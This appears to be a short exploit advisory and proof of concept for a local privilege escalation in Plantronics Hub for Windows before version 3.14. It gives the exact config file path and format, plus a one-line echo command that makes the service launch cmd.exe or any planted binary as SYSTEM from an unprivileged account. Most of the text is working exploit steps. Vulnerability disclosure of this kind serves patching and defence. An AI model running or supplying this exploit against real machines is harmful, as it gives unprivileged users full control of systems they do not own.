# Software Link: https://www.plantronics.com/content/dam/plantronics/software/PlantronicsHubInstaller-3.13.2.exe
# Version: Plantronics Hub for Windows prior to version 3.14

# CVE : N/A

As a regular user drop a file called "MajorUpgrade.config" inside the "C:\ProgramData\Plantronics\Spokes3G" directory. The content of MajorUpgrade.config should look like the following one liner:
<WINDOWS-USERNAME>|advertise|<FULL-PATH-TO-YOUR-DESIRED-PAYLOAD>

Exchange <WINDOWS-USERNAME> with your local (non-administrative) username. Calling cmd.exe is the most basic exploitation, as it will spawn a system shell in your (unprivileged) windows session.
You may of course call any other binary you can plant on the machine.

Steps for exploitation (PoC):
- Open cmd.exe
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config
